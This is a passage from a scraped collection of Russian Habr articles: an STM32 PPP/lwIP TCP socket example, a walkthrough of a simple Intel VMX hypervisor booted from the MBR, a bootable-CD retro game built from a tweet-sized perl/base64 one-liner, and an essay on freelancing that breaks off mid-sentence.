машины (команда ipconfig), у меня он получился 192.168.10.97.\r\n\r\nЗапускаем Packet Sender и настраиваем его следующим образом:\r\n\r\n\r\n\r\nТеперь снова изменим задачу StartDefaultTask, в файле main.c.\r\n\r\n/* USER CODE BEGIN 4 */\n#include \"logger.h\"\n#include \"sockets.h\"\ntypedef uint32_t SOCKET;\n/* USER CODE END 4 */\n\n/* StartDefaultTask function */\nvoid StartDefaultTask(void const * argument)\n{\n  /* init code for LWIP */\n//  MX_LWIP_Init();\n\n  /* USER CODE BEGIN 5 */\n  usart_Open();\n  MX_LWIP_Init();\n  /* Infinite loop */\n\n  uint8_t sendStr[]=\"Test message TCP/IP.\";\n  uint8_t resvStr[100]={0};\n  int     resvLength = 0;\n\n  struct sockaddr_in sockAddr;\n  sockAddr.sin_family = AF_INET;\n  sockAddr.sin_port   = htons( 6565 );\n  uint32_t addr = inet_addr(\"192.168.10.97\");\n  sockAddr.sin_addr.s_addr = addr;\n\n  SOCKET socket = NULL;\n  int nError = 0;\n\n  /* Infinite loop */\n  for(;;)\n  {\n\tHAL_GPIO_WritePin(GPIOD, GPIO_PIN_12|GPIO_PIN_13|GPIO_PIN_14|GPIO_PIN_15, GPIO_PIN_SET);\n\tosDelay(1000);\n\tHAL_GPIO_WritePin(GPIOD, GPIO_PIN_12|GPIO_PIN_13|GPIO_PIN_14|GPIO_PIN_15, GPIO_PIN_RESET);\n\tosDelay(1000);\n\n\tsocket = socket( AF_INET, SOCK_STREAM, 0 );\n\tnError = connect( socket, (struct sockaddr*)&sockAddr, sizeof(sockAddr) );\n\tif ( nError ==  0 )\n\t{\n\t  nError = send( socket, sendStr, sizeof(sendStr)-1, 0 );\n\t  if ( nError <  0 )\n\t\t  logger(\"SEND ERROR %d\\n\", nError);\n\t  else\n\t  {\n\t\t  logger(\"SEND - %s\\n\", sendStr);\n\n\t\t  resvLength = 0;\n\t\t  while(resvLength < 1)\n\t\t\t  resvLength = lwip_recv( socket, resvStr, sizeof(resvStr), MSG_WAITALL);\n\n\t\t  resvStr[resvLength]=0;\n\t\t  logger(\"GET - %s\\n\", resvStr);\n\t  }\n\n\t  lwip_close(socket);\n\t}\n\telse\n\t  logger(\"CONNECT ERROR %d\\n\", nError);\n  }\n  /* USER CODE END 5 */ \n}\n\r\nВ качестве значения переменной addr используем адрес Windows машины, номер порта 6565.\r\nОтправляемое сообщение «Test message TCP/IP.», ответ «The message is received.»\r\n\r\nЗдесь можно увидеть, что функции PPP непосредственно не используются для отправки и приема сообщений. Вся работа происходит на более высоком уровне, а наши функции вызываются автоматически.\r\n\r\nКомпилируем и прошиваем.\r\n\r\nРезультат соединения с pppd видим на Linux машине:\r\n\r\n\r\n\r\nПолученные запросы и отправленные ответы можно увидеть в программе Packet Sender на Windows-машине:\r\n\r\n\r\n\r\nНу, вот, собственно и все, отправленный нами пакет из платы discovery отправился в COM порт, попал на pppd сервер, был отправлен на порт 6565 Windows машины, там он был успешно получен, в ответ на него был отправлен другой пакет, который прошел этот путь в обратном направлении и был успешно принят на плате. С таким же успехом вы сможете отправлять сообщения на любую машину в сети Интернет. \r\n\r\n→ Полный код проекта можно скачать здесь", "images": [{"img": "https://habrastorage.org/webt/u1/0k/6-/u10k6-una1bkmaphl4wlazibaca.jpeg"}, {"img": "https://habrastorage.org/webt/uh/uk/mo/uhukmolq4_t-pckn8h2rjofspnu.png"}, {"img": "https://habrastorage.org/webt/vr/jk/ve/vrjkveavft5ry-oasa7h2e07rwe.png"}, {"img": "https://habrastorage.org/webt/9c/v2/rv/9cv2rv-_8yf5w67mr7bw7ynp1vk.png"}, {"img": "https://habrastorage.org/webt/-s/bb/lk/-sbblkybmbdz1wrftiow38tq4eg.png"}, {"img": "https://habrastorage.org/webt/sd/cc/qy/sdccqyreetba7g_m8yq_gypc-ge.png"}, {"img": "https://habrastorage.org/webt/96/s8/9u/96s89uloxfrdtxd0scqvcyb-zng.png"}, {"img": "https://habrastorage.org/webt/ss/_d/8l/ss_d8lzdxneoj5mjasvmyhhhxiu.png"}, {"img": "https://habrastorage.org/webt/qj/yh/yo/qjyhyoohdofxtqedphuhzq7qcac.png"}, {"img": "https://habrastorage.org/webt/37/bf/om/37bfomzqqcapediljrf14flpuiu.png"}, {"img": "https://habrastorage.org/webt/k5/v6/hc/k5v6hcxebj6hfdgbitfwyzs1ffw.png"}, {"img": "https://habrastorage.org/webt/zc/h4/mp/zch4mpfwyybln76dl1jnhpxjt0s.png"}, {"img": "https://habrastorage.org/webt/u0/cu/zc/u0cuzcnbhzppwdhpibm2o6zelpk.png"}, {"img": "https://habrastorage.org/webt/jy/d4/9s/jyd49satpc3erdlzeddi44gwcy4.png"}, {"img": "https://habrastorage.org/webt/kv/-p/lj/kv-pljob3duk3bigzj3iazcsasa.png"}, {"img": "https://habrastorage.org/webt/k8/zt/uv/k8ztuv4eccjueyvlk8gigjbmkj0.png"}, {"img": "https://habrastorage.org/webt/il/og/h6/ilogh6wuak7zym8unedcnddcjr4.png"}, {"img": "https://habrastorage.org/webt/30/yh/4m/30yh4m_l52nvlkdixrv9zmivehc.png"}]}, {"header": "Виртуальный мир Intel. Практика", "text": "В данной статье я хочу рассмотреть практические аспекты создания простого гипервизора на основе технологии аппаратной виртуализации Intel VMX. \r\n\r\nАппаратная виртуализация достаточно узкоспециализированная область системного программирования и не имеет большого комьюнити, в России уж точно. Я надеюсь, что материал статьи поможет тем, кто захочет открыть для себя аппаратную виртуализацию и те возможности которые она предоставляет. Как было сказано в начале, я хочу рассмотреть именно практический аспект без погружения в теорию, поэтому предполагается что читатель знаком с архитектурой x86-64 и имеет хотя бы общее представление о механизмах VMX. Исходники к статье.\r\n\r\nНачнем с постановки задач для гипервизора:\r\n\r\n\r\n Запуск до загрузки гостевой ОС\r\n Поддержка одного логического процессора и 4 ГБ гостевой физической памяти\r\n Обеспечение правильной работы гостевой ОС с устройствами, спроецированными в области физической памяти\r\n Обработка VMexits\r\n Гостевая ОС с первых команд должна выполняться в виртуальной среде. \r\n Вывод отладочной информации через COM порт (универсальный способ, простой в реализации)\r\n\r\nВ качестве гостевой ОС я выбрал Windows 7 x32, в которой были заданы следующие ограничения:\r\n\r\n\r\nЗадействовано только одно лог.ядро CPU\r\nОтключена опция PAE которая дает возможность 32-битной ОС использовать объем физической памяти, превышающей 4ГБ\r\nBIOS в legacy режиме, UEFI отключено\r\n\r\nОписание работы загрузчика\r\nДля того чтобы гипервизор запускался при старте PC я выбрал самый простой путь, а именно записал свой загрузчик в MBR сектор диска на который установлена гостевая ОС. Так же нужно было где-то на диске разместить код гипервизора. В моем случае, оригинальная MBR считывает bootloader начиная с 2048 сектора, что дает условно свободную область для записи в (2047 * 512) Кб. Этого более чем достаточно для размещения всех компонентов гипервизора.\r\n\r\nНиже приведена схема размещения гипервизора на диске, все значения заданы в секторах.\r\n\r\n\r\n\r\nПроцесс загрузки происходит следующим образом:\r\n\r\n\r\n\r\nloader.mbr считывает c диска код загрузчика — loader.main и передает ему управление.\r\nloader.main выполняет переход в long mode, а затем считывает таблицу загружаемых элементов loader.table, на основании которой выполняется дальнейшая загрузка компонентов гипервизора в память.\r\nПосле завершения работы загрузчика в физической памяти по адресу 0x100000000 находится код гипервизора, такой адрес был выбран для того чтобы диапазон с 0 по 0xFFFFFFFF можно было использовать для прямого отображения в гостевую физическую память.\r\nоригинальный Windows mbr загружается по физической адресу 0x7C00.\r\n\r\nХочу обратить внимание на то что загрузчик после перехода в long mode больше не может пользоваться сервисами BIOS для работы с физическими дисками, поэтому для чтения диска я использовал «Advance Host Controller Interface». \r\n\r\nБолее подробно о котором можно почитать тут.\r\n\r\nОписание работы гипервизора\r\nПосле того как гипервизор получает управление его первая задача заключается в том, чтобы инициализировать окружение в котором ему предстоит работать, для этого последовательно вызываются функции:\r\n\r\n\r\n InitLongModeGdt()  — создает и загружает таблицу из 4х дескрипторов: NULL, CS64, DS64, TSS64\r\n InitLongModeIdt(isr_vector)  — инициализирует первые 32 вектора прерываний общим обработчиком, а точнее его заглушкой\r\n \r\nInitLongModeTSS()  – инициализируется сегмент состояния задачи\r\nInitLongModePages() — инициализация страничной адресации: \r\n\r\n[0x00000000 – 0xFFFFFFFF] – page size 2MB,cache disable;\r\n[0x100000000 – 0x13FFFFFFF] – page size 2 MB, cache write back, global pages;\r\n[0x140000000 – n] – not present;\r\n InitControlAndSegmenRegs()  – перезагрузка сегментных регистров \r\n\r\nДалее необходимо убедиться что процессор поддерживает VMX, проверка выполняется функцией CheckVMXConditions():\r\n\r\n\r\n CPUID.1:ECX.VMX[bit 5] должен быть установлен в 1\r\n В MSR регистре IA32_FEATURE_CONTROL должен быть установлен бит 2 — enables VMXON outside SMX operation и бит 0 – Lock (актуально при отладке в Bochs)\r\n\r\nЕсли все в порядке и гипервизор работает на процессоре, поддерживающем аппаратную виртуализацию переходим к начальной инициализации VMX, смотрим функцию InitVMX():\r\n\r\n\r\nСоздаются области памяти VMXON и VMCS (virtual-machine control data structures) размером 4096 байт. В первые 31 бит каждой из областей записывается VMCS revision identifier взятый из MSR IA32_VMX_BASIC.\r\nВыполняется проверка что в системных регистрах CR0 и CR4 все биты установлены в соответствии с требованиями VMX.\r\nЛогический процессор переводится в режим vmx root командой VMXON (в качестве аргумента физический адрес VMXON region’а).\r\nКоманда VMCLEAR (VMCS) устанавливает launch state VMCS в Clear, так же команда устанавливает implementation-specific значения в VMCS.\r\nКоманда VMPTRLD(VMCS) загружает в current-VMCS pointer адрес VMCS переданной в качестве аргумента. \r\n\r\nВыполнение гостевой ОС начнется в реальном режиме с адреса 0x7C00 по которому, как мы помним, загрузчик loader.main размещает win7.mbr. Для того чтобы воссоздать виртуальную среду идентичную той в которой обычно выполняется mbr, вызывается функция InitGuestRegisterState() которая устанавливает регистры vmx non-root следующим образом:\r\n\r\nCR0 = 0x10\nCR3 = 0\nCR4 = 0\nDR7 = 0\nRSP = 0xFFD6\nRIP = 0x7C00\nRFLAGS = 0x82\nES.base = 0\nCS.base = 0\nSS.base = 0\nDS.base = 0\nFS.base = 0\nGS.base = 0\nLDTR.base = 0\nTR.base = 0\nES.limit = 0xFFFFFFFF\nCS.limit = 0xFFFF\nSS.limit = 0xFFFF\nDS.limit = 0xFFFFFFFF\nFS.limit = 0xFFFF\nGS.limit = 0xFFFF\nLDTR.limit = 0xFFFF\nTR.limit = 0xFFFF\nES.access rights = 0xF093\nCS.access rights = 0x93\nSS.access rights = 0x93\nDS.access rights = 0xF093\nFS.access rights = 0x93\nGS.access rights = 0x93\nLDTR.access rights = 0x82\nTR.access rights = 0x8B\nES.selector = 0\nCS.selector = 0\nSS.selector = 0\nDS.selector = 0\nFS.selector = 0\nGS.selector = 0\nLDTR.selector = 0\nTR.selector = 0\nGDTR.base = 0\nIDTR.base = 0\nGDTR.limit = 0\nIDTR.limit = 0x3FF\r\nСледует обратить внимание на то что поле limit дескрипторного кэша для сегментных регистров DS и ES равно 0xFFFFFFFF. Это пример использования unreal mode — особенности процессора x86 позволяющей обходить лимит сегментов в реальном режиме. Подробней об этом можно почитать тут.\r\n\r\nНаходясь в vmx not-root режиме гостевая ОС может столкнутся с ситуацией, когда необходимо вернуть управление хосту в режим vmx root. В таком случае происходит VM exit во время которого сохраняется текущее состояние vmx non-root и загружается vmx-root. Инициализация vmx-root выполняется функцией InitHostStateArea(), которая устанавливает следующее значение регистров:\r\n\r\nCR0 = 0x80000039\nCR3 = PML4_addr\nCR4 = 0x420A1\nRSP = адрес на начало фрейма STACK64\nRIP = адрес обработчика VMEXIT_handler\nES.selector  = 0x10\nCS.selector = 0x08\nSS.selector = 0x10\nDS.selector = 0x10\nFS.selector = 0x10\nGS.selector = 0x10\nTR.selector = 0x18\nTR.base = адрес TSS\nGDTR.base = адрес GDT64\nIDTR.base = адрес IDTR\r\nДалее выполняется создание гостевого физического адресного пространства (функция InitEPT()). Это один из самых важных моментов при создании гипервизора, потому что неправильно заданный размер или тип на каком-нибудь из участков памяти могут привести к ошибкам которые могут и не проявить себя сразу, но с большой вероятностью будут приводит к неожиданным тормозам или зависаниям гостевой ОС. В общем приятного тут мало и лучше уделить настройке памяти достаточно внимания. \r\n\r\nНа следующем изображении приведена модель гостевого физического адресного пространства:\r\n\r\n\r\n\r\nИтак, что мы тут видим: \r\n\r\n\r\n[0 — 0xFFFFFFFF] весь диапазон гостевого адресного пространства. Тип по умолчания: write back\r\n[0xA0000 — 0xBFFFFF] – Video ram. Тип: uncacheable\r\n[0xBA647000 — 0xFFFFFFFF] – Devices ram. Тип: uncacheable\r\n[0xС0000000 — 0xCFFFFFFF] – Video ram. Тип: write combining\r\n[0xD0000000 — 0xD1FFFFFF] – Video ram. Тип: write combining\r\n[0xFA000000 — 0xFAFFFFFF] – Video ram. Тип: write combining\r\n\r\nИнформацию для создания таких областей я взял из утилиты RAMMap (вкладка Physical Ranges) так же я воспользовался данными из Windows Device Manager. Разумеется, на другом PC диапазоны адресов скорее всего будут отличаться. Что касается типа гостевой памяти, в моей реализации тип определяется только значением, указанным в таблицах EPT. Это просто, но не совсем корректно и вообще следует учитывать тот тип памяти который хочет установить гостевая ОС в своей страничной адресации.\r\n\r\nПосле того как завершено создание гостевого адресного пространства, можно перейти к настройкам VM Execution control field (функция InitExecutionControlFields()). Это довольно большой набор опций, которые позволяют задать условия работы гостевой ОС в режиме vmx not-root. Можно, к примеру, отслеживать обращения к портам ввода вывода или контролировать изменение MSR регистров. Но нашем случае я использую только возможность контролировать установку определенных бит в регистре CR0. Дело в том, что 30(CD) и 29(NW) биты общие как для vmx non-root так и для vmx root режимов и если гостевая ОС установит эти биты в 1 это негативно скажется на производительности. \r\n\r\nПроцесс настройки гипервизора почти завершен, осталось только установить контроль за переходом в гостевой режим vmx non-root и возвращением в режим хоста vmx root. Настройки задаются в функциями:\r\n\r\nInitVMEntryControl() настройки для перехода в vmx non-root:\r\n\r\n\r\nLoad Guest IA32_EFER\r\nLoad Guest IA32_PAT\r\nLoad Guest MSRs (IA32_MTRR_PHYSBASE0, IA32_MTRR_PHYSMASK0, IA32_MTRR_DEF_TYPE)\r\n\r\nInitVMExitControl() настройки для перехода в vmx root:\r\n\r\n\r\nLoad Host IA32_EFER;\r\nSave Guest IA32_EFER;\r\nLoad Host IA32_PAT;\r\nSave Guest IA32_PAT;\r\nHost.CS.L = 1, Host.IA32_EFER.LME = 1, Host.IA32_EFER.LMA = 1;\r\nSave Guest MSRs (IA32_MTRR_PHYSBASE0, IA32_MTRR_PHYSMASK0, IA32_MTRR_DEF_TYPE);\r\nLoad Host MSRs (IA32_MTRR_PHYSBASE0, IA32_MTRR_PHYSMASK0, IA32_MTRR_DEF_TYPE);\r\n\r\nТеперь, когда все настройки выполнены, функция VMLaunch() переводит процессор в режим vmx non-root и начинает выполняться гостевая ОС. Как я упоминал ранее, в настройках vm execution control могут быть заданы условия, при возникновении которых гипервизор вернет себе управления в режиме vmx root. В моем простом примере, я предоставляю гостевой ОС полную свободу действий, однако в некоторых случаях гипервизор все же должен будет вмешаться и скорректировать работу ОС.\r\n\r\n\r\nЕсли гостевая ОС пытается изменить биты CD и NW в регистре CR0 обработчик VM Exit\r\nкорректирует записываемые в CR0 данные. Так же модифицируется поле CR0 read shadow чтобы при чтении CR0 гостевая ОС получила записанное значение.\r\nВыполнение команды xsetbv. Данная команда всегда вызывает VM Exit, независимо от настроек, поэтому я просто добавил ее выполнение в режиме vmx root.\r\nВыполнение команды cupid. Эта команда так же вызывает безусловный VM Exit. Но в ее обработчик я внес небольшое изменение. Если в качестве аргумента в eax будут значения 0x80000002 – 0x80000004, cpuid вернет не название бренда процессора, а строку: VMX Study Core: ) Результат можно увидеть на скриншоте: \r\n\r\n\r\n\r\nИтоги\r\nНаписанный в качестве примера к статье гипервизор вполне способен поддерживать стабильную работу гостевой ОС, хотя конечно и не является законченным решением. Не используется Intel VT-d, реализована поддержка только одного логического процессора, нет контроля за прерываниями и работой периферийных устройств. В общем я не использовал почти ничего из богатого набора средств, которые предоставляет Intel для аппаратной виртуализации. Впрочем, если сообщество заинтересуется я продолжу писать про Intel VMX, тем более что написать есть о чем.\r\n\r\nДа, чуть не забыл, отладку гипервизора и его компонентов удобно проводить с помощью Bochs. На первое время это незаменимый инструмент. К сожалению, загрузка гипервизора в Bochs отличается от загрузки на физическом PC. В свое время я делал специальную сборку чтобы упростить этот процесс, постараюсь привести исходники в порядок и так же выложить вместе с проектом в ближайшее время.\r\n\r\nНа этом все. Спасибо за внимание.", "images": [{"img": "https://habrastorage.org/webt/ek/tv/_z/ektv_zcfq5gcq4bslygiyc2lbqc.jpeg"}, {"img": "https://habrastorage.org/webt/ba/ej/ae/baejaecukny9u7mi6b8udh9crfo.jpeg"}, {"img": "https://habrastorage.org/webt/lm/7b/ll/lm7bllv6hrh9kjv4aoopbzapz1q.jpeg"}, {"img": "https://habrastorage.org/webt/gx/br/cg/gxbrcgcfoiara6ivchp_lm0hgja.jpeg"}]}, {"header": "Загрузочный CD и ретро-игра в одном твите", "text": "\r\nНесколько лет назад я создал загрузочную дискету и ретро-игру, которые помещались в один твит. С тех пор Twitter удвоил длину твитов, поэтому я решил создать загрузочный компакт-диск. Он работает под управлением немного улучшенной версии tron.\r\n\r\nperl -E 'say\"A\"x46422,\"BDRDAwMQFFTCBUT1JJVE8gU1BFQ0lGSUNBVElPTg\",\"A\"x54,\"Ew\",\"A\"x2634,\"/0NEMDAxAQ\",\"A\"x2721,\"BAAAAYQ\",\"A\"x30,\"SVVVqogAAAAAAAEAF\",\"A\"x2676,\"LMBaACgB76gfbgTAM0Qv8D4uYAI86qqgcc+AXP45GA8SHIRPFB3DTeYSEhyBSwCa8CwicMB3rSG/sHNFbRFJjAke9rrwQ\",\"A\"x2638'|base64 -D>cd.iso\r\nКод в твите создаёт загрузочный образ диска CD-ROM: cd.iso. Вы можете загрузить код в qemu или свою любимую виртуальную машину — и играть с помощью клавиш со стрелками. Вы даже можете записать iso на CD-R и загрузиться на реальном компьютере.\r\n\r\nЧтобы создать вручную образ CD, сначала нужно получить базовое представление об ISO 9660. К сожалению, документы со стандартами ISO обычно дорого стоят. Однако ISO 9660 совпадает с ECMA 119, так что спецификации можно прочитать бесплатно.\r\n\r\nУ ISO 9660 множество расширений, таких как UDF, El Torito, RockRidge, Joliet и др. Для загрузочных образов нам важен только El Torito. Спецификация El Torito, на мой взгляд, плохо написана. Там есть ошибки (например, последняя строка в таблице 7), легко забыть, что значения шестнадцатеричные (не указаны префиксы 0x), цифры не отсортированы в интуитивном порядке и т.д. К счастью, документ совсем небольшой.\r\n\r\nЧтобы создать загрузочный диск, начинаем с записи 17 пустых секторов, за которыми следует набор дескрипторов томов (Volume Descriptor Set). Каждый сектор 2048 байт.\r\n\r\nПримечание. Спецификация ISO-9660 говорит, что Volume Descriptor Set начинается с сектора 16. Спецификация El Torito требует начало загрузочной записи в секторе 17. Технически, следует поместить фиктивный дескриптор тома в сектор 16, но и без него всё нормально работает.\r\n\r\nПишем первый дескриптор тома:\r\n\r\n0x00                      // Type (0 = boot record)\n'CD001'                   // Identifier\n0x01                      // Version\n'EL TORITO SPECIFICATION' // Boot System Identifier\n9 x 0x00                  // Padding\n32 x 0x00                 // Unused\n0x13 0x00 0x00 0x00       // Boot Catalog address (in absolute sectors)\n1973 x 0x00               // Unused \r\nВ следующем секторе размещается Volume Descriptor Set Terminator:\r\n\r\n0xff                      // Type (255 = terminator)\n'CD001'                   // Identifier\n0x01                      // Version\n2041 x 0x00               // Unused\r\nЗа дескрипторами томов следует загрузочный каталог (Boot Catalog). El Torito поддерживает разные режимы эмуляции. CD-ROM может эмулировать загрузочную дискету, загрузочный HDD и т.д. Я не устанавливал эмуляцию, то есть BIOS загрузит определённое количество секторов — и возьмёт наш загрузчик.\r\n\r\nКонтрольная сумма вычисляется так, что все 16-битные значения в записи суммируются до 0 (mod 65536).\r\n\r\nПервая запись в загрузочном каталоге (проверочная запись):\r\n\r\n0x01                      // Header ID\n0x00                      // Platform ID (0 = Intel x86)\n0x00 0x00                 // Reserved\n'a'                       // ID string\n23 x 0x00                 // Padding\ncksum cksum               // Checksum (2 bytes)\n0x55 0xaa                 // Key bytes \r\nВторая запись (дефолтная):\r\n\r\n0x88                      // Boot Indicator (0x88 = bootable)\n0x00                      // Boot Media Type (0 = no emulation)\n0x00 0x00                 // Load segment\n0x00                      // System Type\n0x00                      // Unused\n0x01 0x00                 // Number of sectors to load\n0x14 0x00 0x00 0x00       // Virtual disk address (in absolute sectors)\n20 x 0x00                 // Unused \r\nПотом нули до конца сектора:\r\n\r\n1984 x 0x00               // Unused \r\nСледующий сектор — наш загрузчик и ретро-игра:\r\n\r\n; to compile:\n; nasm bootloader.asm -o bootloader.img\n          [bits 16]                    ; Pragma, tells the assembler that we\n                                       ; are in 16 bit mode (which is the state\n                                       ; of x86 when booting from a floppy).\n          [org 0x7C00]                 ; Pragma, tell the assembler where the\n                                       ; code will be loaded.\n\n          mov bl, 1                    ; Starting direction for the worm.\n          push 0xa000                  ; Load address of VRAM into es.\n          pop es\n\nrestart_game:\n          mov       si, 320*100+160    ; worm's starting position, center of\n                                       ; screen\n\n          ; Set video mode. Mode 13h is VGA (1 byte per pixel with the actual\n          ; color stored in a palette), 320x200 total size.\n          mov       ax, 0x0013\n          int       0x10\n\n          ; Draw borders. We assume the default palette will work for us.\n          ; We also assume that starting at the bottom and drawing 2176 pixels\n          ; wraps around and ends up drawing the top + bottom borders.\n          mov       di, 320*199\n          mov       cx, 2176\n          rep\ndraw_loop:\n          stosb                        ; draw right border\n          stosb                        ; draw left border\n          add       di, 318\n          jnc       draw_loop          ; notice the jump in the middle of the\n                                       ; rep stosb instruction.\n\ngame_loop:\n          ; We read the keyboard input from port 0x60. This also reads bytes from\n          ; the mouse, so we need to only handle [up (0x48), left (0x4b),\n          ; right (0x4d), down (0x50)]\n          in        al, 0x60\n          cmp       al, 0x48\n          jb        kb_handle_end\n          cmp       al, 0x50\n          ja        kb_handle_end\n\n          ; At the end bx contains offset displacement (+1, -1, +320, -320)\n          ; based on pressed/released keypad key. I bet there are a few bytes\n          ; to shave around here given the bounds check above.\n          aaa\n          cbw\n          dec       ax\n          dec       ax\n          jc        kb_handle\n          sub       al, 2\n          imul      ax, ax, byte -0x50\nkb_handle:\n          mov       bx, ax\n\nkb_handle_end:\n          add       si, bx\n\n          ; The original code used set pallete command (10h/0bh) to wait for\n          ; the vertical retrace. Today's computers are however too fast, so\n          ; we use int 15h 86h instead. This also shaves a few bytes.\n\n          ; Note: you'll have to tweak cx+dx if you are running this on a virtual\n          ; machine vs real hardware. Casual testing seems to show that virtual machines\n          ; wait ~3-4x longer than physical hardware.\n          mov       ah, 0x86\n          inc       cl\n          int       0x15\n\n          ; Draw worm and check for collision with parity\n          ; (even parity=collision).\n          xor [es:si], ah\n\n          ; Go back to the main game loop.\n          jpo       game_loop\n\n          ; We hit a wall or the worm. Restart the game.\n          jmp       restart_game\n\nTIMES 2048 - ($ - $$) db 0             ; Fill the rest of the sector with 0\r\nЗатем я написал скрипт для компиляции загрузчика, сборки образа и генерации твита. Наконец, я прожёг CD и проверил, что всё работает на реальном оборудовании.", "images": [{"img": "https://habrastorage.org/getpro/habr/post_images/656/ee4/2fe/656ee42fe767daa9c4720b24cfc43021.png"}]}, {"header": "Недостатки фриланса. Личный опыт", "text": "\r\n\r\nЭто еще один пост из постоянной рубрики «фриланс vs. офис». На разных фриланс тусовках, да и стоящие рядышком удаленщики, все чаще говорят о том, что работа переезжает на «удаленные рельсы». Эта знаменитая фраза — «Лучшие разработчики живут не в Сан-Франциско, а по всему миру». Проекты с полностью удаленными командами вроде basecamp. В целом рост бирж за последнии несколько лет в разы — наводят на мысль, что удаленка и фриланс — это зарождение клондайка.\r\n\r\nРазвалившись в гамаке, на берегу острова Бора Бора, ты неспешно рисуешь скетч или отрабатываешь навыки js-ниндзя.\r\n\r\nВ левой руке махито, в правой мулат(ка). И основным обременяющим занятием есть поход к банкомату.\r\n\r\nМожет так и бывает, но уж точно не у меня. Поэтому, проработав 12 лет на фрилансе (около 11,000 часов), внезапно, я задумался — а что дальше? А почему я топчусь на месте то. Пусть у единиц, но получается расти дальше, расширять базу клиентов, основывать компании, интересно жить в конце концов.\r\n\r\nПоэтому этот пост с СЕО-шным названием будет именно о том, что не так во фрилансе со «своей колокольни». Во-первых самоанализа ради. А во-вторых для того парня из офиса, который мылится работать на себя, да все никак… За 12 лет много опыта накопилось, есть чем поделиться. Много примеров из опыта.\r\n\r\n Начало\r\nНачало во фрилансе — это такая лотерея, с элементами унижений, отчаяния, возможно разбитых надежд. Я конечно драматизирую, в контексте тех хитрых ребят, которые увели чьего-то заказчика или нашли его на стороне и привели на Upwork. Да, кстати, речь в этом посте пойдет именно про биржу Upwork, если не указано обратное. Именно на ней я провел 12 лет с перерывами.\r\n\r\nТак вот, очевидный момент. Если у тебя голый профайл и нет отзывов о прошлых работах — то искать тебе и искать эту долгожданную работенку на 50$. Не верите? Вот только был случай. Нанимал ребят iOS и Android разрабов. Сделали довольно хорошо часть программы, за которую я получил 1200$, их же интересовал только фидбек. Не хвальбы ради, а скорее для подтверждения факта, насколько важна репутация и опыт во фрилансе. \r\n\r\nПосему начинать всегда тяжело. Демпинговать, спамить, «просить звездочку», нескончаемые доделки переделки — все это обязательный атрибут первых заказов на фрилансе.\r\n\r\nДа, если ты студент, и качаешь например Ruby, то почему бы не покачать. А вот если войти-вайтишник, с ярым желанием заработать — то будет не просто.\r\n\r\nУ меня история с фрилансом началась в 2006 году, когда не было еще толпы индусов, а биржа называлась oDesk. Я был студеном (не голодным), дал объявление в газету! Меня нашел какой-то местный фрилансер и заверте…\r\n\r\nПо 6$/час я с большой радостью писал программки американским студентам, а не своим. Потом попался крупный клиент и мы дружно переехали с agency, на мой индивидуальный профайл, чтоб не платить посреднику. \r\n\r\nПервый клиент\r\nКак правило неадекват. Ясно понимая, что все козыри у него распиханы по рукавам, как то — твой первый отзыв, первый заработанный доллар, да и вообще все в первой. Этот парень будет выжимать тебя, как спелый лимон. И вряд ли у тебя будет много контраргументов, вроде распальцевки — «this is extra» или «this is impossible». За пол дня будь добр сделай.\r\n\r\nДа, да. Вы скажете — надо знать себе цену, показать черный пояс по Ангуляр, но мы же говорим о недостатках. И поверьте моему опыту заказчика — довольно легко требовать работу с новичка, за минимум платы и максимум эфорта. Это бизнес.\r\n\r\nНерабочая обстановка\r\nСлез с дивана. Взял ноут. Залез на диван. За стенкой — 3 воющие сирены в виде малышей и жены. Сверху перфоратор.\r\n\r\nТак и заснул на диване, ничего не сделав…\r\n\r\nДисциплина — это первое, чему нужно научится фрилансеру. Сюда же входит режим, питание, прогулки, время на себя, итд., итп.\r\n\r\nШалтай-балтай — не получится. Все таки не Шон Паркер. И надо руку держать на пульсе (телефоне) все время. Ребята из бизнеса не очень любят, когда им не отвечают.\r\n\r\nРежим\r\nВ продолжении предыдущего пункта — режим, слово довольно размытое для фрилансера. Это вам не 9-18 и суббота выходной. \r\n\r\nЭто 24/7, без выходных и праздников. Опять могу преувеличивать, но если вы хотите быстро подняться, придется работать как владелец бизнеса, то бишь все время за пультом. Это спустя время, можно перебирать харчами, и выбрать себе одного европейца парт-тайм, одного лояльного американца, который чтит все праздники и выходные на Руси. А по началу вигвам.\r\n\r\nОплата\r\nМогут кинуть. Куда ж без этого. Справедливости ради скажу, что со мной это происходило один или два раза из около 60 проектов. Суммы небольшие, но очень неприятно, когда стараешься — а клиент пропадает с твоей работой.\r\n\r\nЗападло номер два — программы-трекеры. Не поесть, не пописать. Все время держит в напряжении, вырабатывая какую-то неведомую привычку «побольше-высидеть-часов». Бывали случаи у знакомых, когда после 15-часовых марафонов под трекером — они слышали Европу+ из раковины. А некоторым казалось, что за ними следят на улице. Со мной такого не было — но голова болела знатно, уже после 6 часов непрерывного кодинга.\r\n\r\nКак альтернативу почасовке, Бог придумал fixed-price с escrow. Скажем так. Слово escrow, то бишь гарантия выплаты, работает только до обращения клиента в сапорт с просьбой вернуть деньги. Ко всему прочему, выбивать по 300-500-1000 долларов, надо еще уметь, то бишь обосновать. В этом плане почасовка проще в плане разговоров о деньгах с клиентом.\r\n\r\nНу и самая мякотка — это когда можно добавлять потраченное время в ручную. Так работает большинство крупных контор в офисе, также можно и договорится с человеком, когда есть доверие. Со временем уже фрилансер диктует условия.\r\n\r\nСоциум\r\nЕго нет. Только не надо пожалуйста про коворкинги или снять хату с корешами. Сам молча стучишь по клаве до выпученных глаз. Никто не мешает сходить в группы Анонимных Алкоголиков, поговорить? Хмм… это смотря как работать. Обычно к концу дня желание одно — лечь и потупить. Фриланс — это не печеньки. Фриланс — это не настолки и тренажерка внизу. Фриланс — это сколько отработал — столько получил. Поэтому здесь 8-10 часов по нагрузке сравнимо с 2-3 днями в офисе.\r\nНе забудьте про трекер.\r\n\r\nА как же друзья, семья, знакомые? Ну что я вам скажу. Если друзья фрилансеры — то ситуация примерно такая же. Ваше общение потихоньку переходит в скайп-чатик, и на этом дружба заканчивается. Семья, знаете ли, каждый занят своим делом.\r\n\r\nА папа — приставка для компьютера. Чего его беспокоить? Вот и получается раз в квартал собираемся.\r\n\r\nНа всяких ивентах, со знакомыми, чаще чувствуешь себя белой вороной, нежели приобщенным к делу индивидом.\r\n\r\nТут у людей карьерный рост, обсуждение политики и селебрети. А тебе оно зачем? У тебя же есть трекер… и IDE. \r\n\r\nКоммуникация\r\nВ дополнение к предыдущему. Она атрофируется. Если вы конечно не продажник на удаленке — то фрилансер медленно, но верно выпадает из общества. Люди разные, кто-то выбирает одиночество, кто-то жить не может без людей, но справедливо, что выбирая фриланс — вы сознательно замыкаетесь в себе. Контакты с людьми все реже. Какие-то жизненные мелочи, вроде\r\nпохода в кино — 